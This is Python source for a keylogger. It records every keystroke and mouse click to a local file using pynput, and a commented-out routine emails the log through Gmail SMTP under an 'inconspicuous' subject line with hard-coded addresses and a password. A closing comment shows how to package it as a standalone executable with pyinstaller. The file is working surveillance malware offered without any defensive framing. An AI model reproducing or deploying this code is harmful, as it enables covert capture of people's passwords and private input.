keys = []

import threading
from threading import Thread

from pynput import keyboard
from pynput import mouse

##import smtplib
##from email.mime.multipart import MIMEMultipart
##from email.mime.text import MIMEText
##from email.mime.base import MIMEBase
##from email import encoders

fromaddr = "193w574257@gmail.com"
toaddr = "a6sfh6ec@gmail.com"

import os


#----------------------------------------------------------------------------


def on_press(key):
    f = open('keylog.txt','a+')
    keys.append(key)
    f.write(str(key) + " ")
    yes = True
    f.close()

def on_click(x, y, button, pressed):
    f = open('keylog.txt','a+')
    keys.append(('{0} at {1}'.format('Pressed',(x,y))))
    f.write(str(('{0} at {1}'.format('Pressed',(x,y)))))
    f.close()


#----------------------------------------------------------------------------


##def get_window(x, y):
##    root = tk.Tk()
##    root.attributes("-alpha", 0)
##
##    width = root.winfo_screenwidth()
##    height = root.winfo_screenheight()
##
###    if x >= width/2 and y >= height/2:
##    print(str(width) + ", " + str(height))
###    else:
## #       print("something else")
####    ## etc


#----------------------------------------------------------------------------


def func1():
    with keyboard.Listener(on_press = on_press) as listener:
        listener.join()

def func2():
    with mouse.Listener(on_click=on_click) as listener1:
        listener1.join()

##def func3 ():
##
##    msg = MIMEultipart.MIMEultipart()
##
##    msg['From'] = fromaddr
##
##    msg['To'] = toaddr
##
##    msg['Subject'] = "Inconspicious Subject Name"
##
##    body = "Body Text"
##
##    msg.attach(MIMEText(body, 'plain'))
##
##    filename = "keylog.txt"
##    attachment = open("os.getcwd()", "rb")
##
##    p = MIMEBase('application', 'octet-stream')
##    
##    p.set_payload((attachment).read())
##     
##    encoders.encode_base64(p)
##      
##    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
##     
##    msg.attach(p)
##     
##    s = smtplib.SMTP('smtp.gmail.com', 587)
##     
##    s.starttls()
##     
##    s.login(fromaddr, "930258A26-")
##     
##    text = msg.as_string()
##     
##    s.sendmail(fromaddr, toaddr, text)
##     
##    s.quit()


#----------------------------------------------------------------------------


if __name__ == '__main__':
    Thread(target=func1).start()
    Thread(target=func2).start()
##    Thread(target=func3).start()

#----------------------------------------------------------------------------



# pyinstaller --onefile key_logger.py
